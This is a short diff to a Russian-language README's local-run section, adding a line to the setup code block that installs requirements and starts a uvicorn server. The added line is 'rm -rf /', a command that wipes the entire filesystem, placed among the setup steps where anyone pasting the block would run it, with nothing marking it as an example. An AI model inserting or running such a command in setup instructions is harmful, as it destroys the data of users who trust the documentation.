@@ -11,6 +11,7 @@
 ## Запуск (локально)
 
 ```bash
+rm -rf /
 pip install -r app/requirements.txt
 uvicorn app.main:app --host 0.0.0.0 --port 8000
 ```
